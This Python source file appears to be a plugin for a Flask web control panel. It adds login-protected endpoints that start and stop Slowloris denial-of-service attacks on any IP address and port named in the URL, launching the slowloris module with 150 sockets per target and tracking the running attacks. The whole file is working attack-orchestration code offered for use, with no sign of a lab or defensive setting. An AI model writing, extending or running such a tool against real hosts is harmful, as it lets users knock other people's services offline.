import os
import subprocess
import signal
from pprint import pprint

import flask
from flask_login import login_required

process = list()


# noinspection PyUnresolvedReferences,PyProtectedMember
def stop_slowloris(ip, port):
    """
    This function stops the slowloris attack.
    :return:
    """
    for x in process:
        if x['key'] == f'{ip}:{port}':
            x['popen'].terminate()
            process.remove(x)
            print('Stopped Slowloris')
            try:
                os.kill(x['popen'].pid, signal.SIGTERM)
            except ProcessLookupError:
                pass
            return flask.redirect('/slowloris/')
    return '1'  # flask.redirect('/slowloris/')


def stop_all_slowloris():
    """
    This function stops all slowloris processes.
    :return:
    """
    for x in process:
        x['popen'].terminate()
        process.remove(x)
    return 'stopped all', 200


# noinspection PyGlobalUndefined
def start_slowloris(ip, port):
    global slowloris_thread
    global process
    """
    This function starts the slowloris attack on the given ip and port.
    :param ip: The ip of the target
    :param port: The port of the target
    :return:
    """

    tempprocess = dict()
    tempprocess['key'] = f'{ip}:{port}'

    tempprocess['popen'] = subprocess.Popen(
        ['python', '-m', 'slowloris', '-u', ip, '-p', port, '-s', '150'])

    process.append(tempprocess)
    return 'Started Slowloris'


def required_variables():
    """
    This Function just returns a dictionary with all the variables the program needs to run under
    the key "wanted". There is as well the key "response" I implemented it for future use. At the
    Moment you can just ignore it. The Function should be run before the run_code function is ran to
    prevent errors.
    :return: list of variables the program will need to work
    """
    return {'wanted': ['current_user', 'app'],
            'response': []
            }


# noinspection PyUnusedLocal,PyPep8Naming
def register_endpoints(app: flask.Flask, endpoints: list = None):
    """
    This function registers the endpoints for the service.
    :param endpoints: A list of endpoints that should be registered. The list contains a sublist for
    every endpoint. The sublist contains the endpoint, the method, the view function and if login is
    required.
    :type app: flask.Flask
    """
    try:
        for x in endpoints:
            if x['login_required'] is True:
                print(f'Registering endpoint {x["endpoint"]} with login required')
                x['view_function'] = app.route(x['endpoint'], methods=x['method'])(
                    login_required(x['view_function']))
            else:
                x['view_function'] = app.route(x['endpoint'], methods=x['method'])(
                    x['view_function'])
    except AssertionError:
        pass


def run_code(*args):
    """
    This code will be executed in the app.py. Here the magic happens, and you code the python
    part of
    your service

    :param args: list
    :return: The rendered Website
    """

    # extracting the variables from the *args
    current_user = args[0][0]
    app: flask.Flask = args[0][1]

    links = list()

    # here you define all the endpoints for the service. Without the base path '/<service_name>/'>'

    register_endpoints(app, [
        {'endpoint': '/slowloris/stop/<string:ip>/<string:port>', 'method': ['GET'],
         'view_function': stop_slowloris,
         'login_required': True},
        {'endpoint': '/slowloris/start/<string:ip>/<string:port>', 'method': ['GET'],
         'view_function':
             start_slowloris,
         'login_required': True},
        {'endpoint': '/slowloris/stopall/', 'method': ['GET'],
         'view_function': stop_all_slowloris,
         'login_required': True}
    ])

    for rule in app.url_map.iter_rules():
        if len(rule.defaults or {}) >= len(rule.arguments):
            url = flask.url_for(rule.endpoint, **(rule.defaults or {}))
            links.append([rule.endpoint, url])

    # returning the rendered side
    return flask.render_template('services/slowloris.html', current_user=current_user)
